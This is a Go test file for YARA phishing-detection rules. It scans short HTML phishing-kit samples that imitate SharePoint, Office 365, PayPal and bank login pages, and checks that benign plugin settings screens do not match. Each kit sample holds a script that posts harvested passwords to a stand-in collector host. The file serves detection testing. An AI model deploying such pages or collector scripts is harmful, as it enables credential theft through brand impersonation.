//go:build yara

package yara

import "testing"

// A phishing kit that posts the harvested fields with JavaScript instead of a
// form action attribute.

func TestPhishingSharepoint_JavaScriptSubmission(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`<html><head><title>SharePoint - secured by Microsoft</title></head>
<body><form id="l"><input type="email" name="u"><input type="password" name="p">
<button type="button" onclick="go()">Sign in</button></form>
<script>function go(){fetch('https://collector.example.test/log.php',{method:'POST',body:new FormData(document.getElementById('l'))});}</script>
</body></html>`)
	if !hasYaraRule(s.ScanBytes(mal), "phishing_sharepoint") {
		t.Error("phishing_sharepoint gap: kit submitting through JavaScript not detected")
	}
	extensionless := []byte(`<html><head><title>SharePoint - secured by Microsoft</title></head>
<body><form id="l"><input type="password" name="p"></form>
<script>fetch('https://collector.example.test/collect', {method: 'POST', body: new FormData(document.getElementById('l'))});</script>
</body></html>`)
	if !hasYaraRule(s.ScanBytes(extensionless), "phishing_sharepoint") {
		t.Error("phishing_sharepoint gap: extensionless JavaScript collector not detected")
	}
	// Kits that build the body by hand carry no FormData and no serialize call.
	// What convicts them is the destination: a collector script off-site.
	manualBody := []byte(`<html><head><title>SharePoint - secured by Microsoft</title></head>
<body><form id="l"><input type="password" name="p"></form>
<script>fetch('https://collector.example.test/log.php', {method: 'POST', body: 'u=' + u.value + '&p=' + p.value});</script>
</body></html>`)
	if !hasYaraRule(s.ScanBytes(manualBody), "phishing_sharepoint") {
		t.Error("phishing_sharepoint gap: kit posting a hand-built body to a collector script not detected")
	}

	legit := []byte(`<div class="wrap"><h1>OneDrive backup</h1>
<p>Connect this site to OneDrive and Microsoft 365.</p>
<form method="post"><input type="password" name="onedrive_app_secret" autocomplete="off"></form>
<script>jQuery.post(ajaxurl, {action: 'onedrive_test_connection'}, function (r) { render(r); });</script></div>`)
	if hasYaraRule(s.ScanBytes(legit), "phishing_sharepoint") {
		t.Error("phishing_sharepoint FP: OneDrive backup plugin settings screen matched")
	}
}

func TestPhishingBrandFamily_JavaScriptSubmission(t *testing.T) {
	s := loadRepoYaraScanner(t)
	cases := []struct {
		rule   string
		sample string
	}{
		{
			rule: "phishing_office365",
			sample: `<html><head><title>Office 365</title></head><body>
<form id="f"><input type="password" name="passwd"></form>
<script>document.getElementById('f').addEventListener('submit', function (e) { e.preventDefault(); navigator.sendBeacon('https://drop.example.test/collect', new FormData(this)); });</script>
</body></html>`,
		},
		{
			rule: "phishing_paypal",
			sample: `<html><head><title>PayPal - Log in</title></head><body>
<form id="f"><input type="password" name="pw"></form>
<script>var x = new XMLHttpRequest(); x.open('POST', 'https://drop.example.test/collect', true); x.send(new FormData(document.getElementById('f')));</script>
</body></html>`,
		},
		{
			rule: "phishing_bank_generic",
			sample: `<html><body><h1>Online banking</h1><p>Enter your account number and security code.</p>
<form id="f"><input type="password" name="pin"></form>
<script>jQuery.ajax({url: 'https://drop.example.test/collect', method: 'POST', data: jQuery('#f').serialize()});</script>
</body></html>`,
		},
	}
	for _, tc := range cases {
		if !hasYaraRule(s.ScanBytes([]byte(tc.sample)), tc.rule) {
			t.Errorf("%s gap: kit submitting through JavaScript not detected", tc.rule)
		}
	}

	// A mail plugin's settings screen carries the brand's own OAuth endpoint in
	// its script. An absolute URL is not a collector on its own; a kit posts to
	// a script that stores what it receives.
	oauth := []byte(`<div class="wrap"><h1>Office 365 mailer</h1>
<form method="post"><input type="password" name="o365_client_secret"></form>
<script>var cfg = {url: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize', client: id};</script></div>`)
	if hasYaraRule(s.ScanBytes(oauth), "phishing_office365") {
		t.Error("phishing_office365 FP: plugin settings screen naming the brand OAuth endpoint matched")
	}
	oauthPOST := []byte(`<div class="wrap"><h1>Office 365 mailer</h1>
<form method="post"><input type="password" name="o365_client_secret"></form>
<script>fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
method: 'POST', body: new URLSearchParams({client_id: id, client_secret: secret})
});</script></div>`)
	if hasYaraRule(s.ScanBytes(oauthPOST), "phishing_office365") {
		t.Error("phishing_office365 FP: plugin posting OAuth parameters to the brand endpoint matched")
	}

	// An SMTP plugin settings screen names the brand, takes a password, and
	// talks to its own site.
	legit := []byte(`<div class="wrap"><h1>Office 365 SMTP</h1>
<form method="post"><input type="password" name="o365_client_secret"></form>
<script>jQuery.post(ajaxurl, {action: 'o365_send_test'}, function (r) { render(r); });</script></div>`)
	if hasYaraRule(s.ScanBytes(legit), "phishing_office365") {
		t.Error("phishing_office365 FP: SMTP plugin settings screen matched")
	}
}
